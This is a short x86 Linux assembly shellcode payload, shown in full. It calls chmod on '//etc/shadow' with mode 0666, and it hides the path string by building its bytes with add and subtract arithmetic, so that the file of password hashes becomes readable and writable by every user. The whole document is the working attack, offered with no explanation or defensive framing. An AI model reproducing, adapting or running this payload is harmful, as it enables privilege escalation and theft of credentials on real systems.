section .text
        global _start
 
_start:
        ; chmod("//etc/shadow", 0666);
        xor     eax, eax
        mov     al, 0xf
        cdq
        push    edx
         ;push dword 0x776f6461
        mov     ecx, 0x665e5350
        add     ecx, 0x11111111
        push    ecx
         ;push dword 0x68732f63
        sub     ecx, 0xefc34fe
        push    ecx
         ;push dword 0x74652f2f
        add     ecx, 0xbf1ffcc
        push    ecx
        mov     ebx, esp
        mov     cx, 0666o
        int     0x80
